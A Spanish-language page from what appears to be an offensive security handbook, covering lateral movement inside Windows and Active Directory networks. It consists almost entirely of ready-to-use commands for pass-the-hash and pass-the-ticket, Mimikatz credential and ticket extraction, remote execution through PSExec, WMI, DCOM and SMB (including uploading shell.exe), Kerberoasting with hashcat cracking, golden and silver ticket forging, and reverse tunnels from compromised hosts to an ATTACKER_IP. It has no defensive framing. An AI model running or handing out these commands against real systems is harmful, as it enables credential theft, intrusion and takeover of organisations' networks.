# ➡️ Fase 4: Movimiento lateral

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](04-Lateral-Movement.tr.md) • [🇬🇷 Ελληνικά](04-Lateral-Movement.el.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Objetivo:** Desplazarse desde el sistema comprometido a otros sistemas de la red.

---

## 🔑 Movimiento basado en credenciales

### Pass-the-Hash (PTH)
```bash
# PSExec de Impacket con hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Exportar el ticket desde la memoria (Mimikatz)
sekurlsa::tickets /export

# Importar el ticket
kerberos::ptt ticket.kirbi

# O con Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Verificar el ticket
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz - Solicitar un TGT con un hash NTLM
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# Usar un certificado para autenticarse
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# Con Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Métodos de ejecución remota

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# WMIExec de Impacket (más discreto)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM con contraseña
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM con hash
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# Comunicación remota de PowerShell
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# Ejecución de comandos con CrackMapExec
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Copia de archivos mediante SMB
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# Al estilo de PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# Con hash NTLM (modo de administración restringida)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Habilitar RDP de forma remota
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH con contraseña
ssh user@192.168.1.10

# SSH con clave
ssh -i id_rsa user@192.168.1.10

# Túneles SSH y pivoting (acceso a redes a través de otro equipo)
ssh -D 9050 user@192.168.1.10  # Proxy SOCKS
ssh -L 8080:internal:80 user@192.168.1.10  # Local port forward
```

---

## 🔄 Pivoting de red

### Túneles SSH
```bash
# Reenvío de puerto local (acceder a internal:80 mediante localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Proxy SOCKS dinámico
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Reenvío de puerto remoto
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# En el equipo atacante (servidor)
./chisel server --reverse --port 8080

# En el equipo objetivo (cliente)
./chisel client ATTACKER_IP:8080 R:socks

# Usar con proxychains
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# En el equipo atacante
./proxy -selfcert

# En el equipo objetivo
./agent -connect ATTACKER_IP:11601 -ignore-cert

# En la consola del proxy
session
start
```

### Pivoting con Metasploit
```bash
# Añadir una ruta a través de la sesión de Meterpreter
run autoroute -s 192.168.2.0/24

# O manualmente
route add 192.168.2.0 255.255.255.0 1

# Proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Ataques Kerberos

### Kerberoasting
```bash
# Obtener tickets de servicio
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Descifrar el hash con hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Buscar usuarios sin preautenticación
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Descifrar el hash
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket
```powershell
# Obtener primero el hash de krbtgt y después:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket
```powershell
# Crear un ticket para un servicio concreto
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Referencia rápida

### Técnicas de movimiento lateral

| Técnica | Puerto | Herramienta |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Credenciales necesarias

| Método | Requisito |
|--------|-------------|
| Pass-the-Hash | Hash NTLM |
| Pass-the-Ticket | Ticket Kerberos |
| PSExec | Administrador + acceso SMB |
| WinRM | WinRM habilitado + administrador |
| RDP | RDP habilitado + grupo de usuarios de RDP |

---

## 🔗 Guías de referencia relacionadas

- [Impacket](../../Impacket/translations/README.es.md)
- [CrackMapExec](../../CrackMapExec/translations/README.es.md)
- [Evil-WinRM](../../Evil-WinRM/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)
- [Rubeus](../../Rubeus/translations/README.es.md)

---

**Fase anterior:** [← 03 - Escalada de privilegios](./03-Privilege-Escalation.es.md)

**Fase siguiente:** [05 - Persistencia →](./05-Persistence.es.md)
